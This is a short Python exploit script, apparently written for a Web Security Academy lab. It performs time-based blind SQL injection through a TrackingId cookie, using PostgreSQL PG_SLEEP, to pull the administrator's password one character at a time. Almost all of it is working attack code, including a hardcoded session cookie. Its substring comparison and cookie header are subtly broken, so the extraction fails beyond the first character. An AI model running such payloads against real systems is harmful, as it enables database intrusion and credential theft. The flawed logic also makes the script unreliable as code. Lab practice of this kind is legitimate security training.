#!/usr/bin/python3.6

import requests
import time

LAB_URL = 'https://acac1f5e1f49064680ca995400d80022.web-security-academy.net/'
PASSWORD_LENGTH = 6
WAIT_TIME = '5'
COUNT = 1
password = ''

_payload = lambda count, ch, operator: 'xyz\'%3BSELECT+CASE+WHEN+\
(username=\'administrator\'+AND+SUBSTRING(password, 1,'+ count +')'+operator+'\'' + ch + '\'' + ')+THEN+PG_SLEEP('+ WAIT_TIME + ')+ELSE+PG_SLEEP(0)+END+FROM+users--' 

_headers = lambda payload: {'Cookie': 'TrackingId=' + payload + 'session=wW5wFu4OjKSFwfNBnyRyewIdu8tCw5kM'}

while COUNT <= PASSWORD_LENGTH:
	for c in range(33,127):
		payload_str = _payload(str(COUNT), chr(c), '=')
		print('[*]Sending request {}...'.format(payload_str))
		start = time.perf_counter()
		res = requests.get(LAB_URL, headers=_headers(payload_str))
		end = time.perf_counter()

		diff = end - start
		print('time delay {}'.format(round(diff,1)))
		if round(diff,1) > float(WAIT_TIME):
			print('[*]Found character \'{}\' at position {}...'.format(chr(c), COUNT))
			password += chr(c)
	COUNT += 1

print('-------------------------------------\n\n')
if password:
	print('Found password {}'.format(password))
else:
	print('Password not found')						
